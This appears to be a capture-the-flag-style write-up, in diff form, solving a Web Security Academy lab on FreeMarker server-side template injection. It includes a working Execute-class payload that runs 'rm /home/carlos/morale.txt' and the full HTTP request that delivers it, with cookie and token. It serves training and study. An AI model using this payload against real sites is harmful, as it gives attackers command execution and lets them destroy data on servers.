@@ -1,0 +1,41 @@
+Server-side template injection using documentation
+
+Let's start by fishing our for an error. On a random product description, I used this:
+
+<p>Hurry! Only ${product} left of ${product.name} at ${product.price}.</p>
+
+Clicking preview got me the following error:
+<p>Hurry! Only lab.display.productcatalog.page.product.description.template.FreeMarkerProduct@600be89b left of What Do You Meme? at $72.19.</p> 
+
+FreeMarker it is then.
+
+Checking the documentation for the TemplateModel, we can spot an Execute class:
+https://freemarker.apache.org/docs/api/freemarker/template/TemplateModel.html
+
+Now to adapt the exploit provided here:
+https://portswigger.net/research/server-side-template-injection
+
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+
+Add it to a product description:
+
+<p>Hurry!+Only+<#assign+ex="freemarker.template.utility.Execute"?new()>+${+ex("rm+/home/carlos/morale.txt")+}+left+of+${product.name}+at+${product.price}.</p>
+
+And hit preview. That should do it.
+
+Final Request:
+POST /product/template?productId=2 HTTP/1.1
+Host: aca01f791f04ac2b80cd0248005c00d2.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 294
+Origin: https://aca01f791f04ac2b80cd0248005c00d2.web-security-academy.net
+Connection: close
+Referer: https://aca01f791f04ac2b80cd0248005c00d2.web-security-academy.net/product/template?productId=2
+Cookie: session=UWzsZ91PzeYgWkVR0aCOkfcyaBOm5GjQ
+Upgrade-Insecure-Requests: 1
+
+csrf=HeNMkWcEbzOGpLO1ZtVRpoU8yyY5XSfB&template=%0D%0A%3Cp%3EHurry%21+Only+%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22rm+%2Fhome%2Fcarlos%2Fmorale.txt%22%29+%7D+left+of+%24%7Bproduct.name%7D+at+%24%7Bproduct.price%7D.%3C%2Fp%3E&template-action=save
